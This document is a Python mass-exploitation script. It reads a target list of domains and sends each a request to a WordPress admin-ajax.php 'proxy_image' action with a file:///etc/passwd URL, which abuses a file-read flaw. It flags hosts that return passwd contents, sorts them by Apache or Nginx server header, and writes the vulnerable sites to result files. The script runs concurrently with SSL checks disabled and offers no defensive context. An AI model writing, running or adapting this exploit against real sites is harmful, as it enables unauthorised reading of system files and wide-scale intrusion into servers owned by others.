import requests
import concurrent.futures
import urllib3
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Load target list from file
with open("list.txt") as f:
    domains = [line.strip() for line in f if line.strip()]

# Containers for results
result_passwd = []
result_apache = []
result_nginx = []

headers = {
    "User-Agent": "Mozilla/5.0"
}

def check_target(domain):
    try:
        # Add http scheme if missing
        if not domain.startswith("http"):
            domain = "http://" + domain
        parsed = urlparse(domain)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Test for /etc/passwd file read
        test_url = f"{base_url}/wp-admin/admin-ajax.php?action=proxy_image&url=file:///etc/passwd"
        r = requests.get(test_url, headers=headers, timeout=10, verify=False)
        if "root:x:0:0:" in r.text:
            print(f"[+] /etc/passwd FOUND on {base_url}")
            result_passwd.append(base_url)

            # Check server header
            head = requests.head(base_url, headers=headers, timeout=10, verify=False)
            server = head.headers.get("Server", "").lower()
            if "nginx" in server:
                result_nginx.append(base_url)
                print("    └── Server: Nginx")
            elif "apache" in server:
                result_apache.append(base_url)
                print("    └── Server: Apache")
            else:
                print("    └── Server: Unknown")
    except Exception as e:
        print(f"[-] Failed to check {domain}: {str(e)}")

# Run checks concurrently
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(check_target, domains)

# Save results
with open("result.txt", "w") as f:
    for url in result_passwd:
        f.write(url + "\n")

with open("passwd_server_apache.txt", "w") as f:
    for url in result_apache:
        f.write(url + "\n")

with open("passwd_server_nginx.txt", "w") as f:
    for url in result_nginx:
        f.write(url + "\n")

print("\n[✓] Scan complete. Results saved to result.txt, passwd_server_apache.txt, passwd_server_nginx.txt")
